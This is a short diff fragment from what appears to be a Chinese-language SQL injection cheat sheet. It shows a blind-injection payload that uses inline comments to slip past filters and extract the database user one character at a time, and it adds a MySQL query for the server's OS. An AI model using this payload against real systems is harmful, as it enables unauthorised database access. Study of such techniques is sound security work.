@@ -196,3 +196,12 @@ CURRENT_USER 代替 CURRENT_USER()
 
 最终例子:
 444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#
+
+
+
+mysql> select @@version_compile_os;
++----------------------+
+| @@version_compile_os |
++----------------------+
+| Linux                |
++----------------------+
